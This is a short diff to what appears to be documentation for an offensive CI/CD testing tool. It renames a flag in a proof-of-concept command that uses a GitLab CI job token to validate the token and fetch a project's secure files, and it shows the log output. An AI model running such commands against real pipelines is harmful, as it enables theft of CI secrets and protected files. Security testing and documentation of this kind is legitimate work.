@@ -415,7 +415,7 @@ docker run --rm --entrypoint sh registry.gitlab.example.com/auser/artipacked:lat
 Then validate and create PoC exploit:
 
 ```bash
-pipeleek gl jobToken exploit --project auser/artipacked --token glcbt-6c_z1CoZjUyFfAu6cE2XFTC
+pipeleek gl jobToken exploit --repo auser/artipacked --token glcbt-6c_z1CoZjUyFfAu6cE2XFTC
 2026-02-09T15:25:30Z info Job token validation succeeded
 2026-02-09T15:25:30Z info Job token context resolved job_id=13042619352 project=auser/artipacked project_id=79339419 ref=main status=running web_url=https://gitlab.example.com/auser/artipacked/-/jobs/13042619352
 2026-02-09T15:25:30Z info Fetching secure files project=auser/artipacked
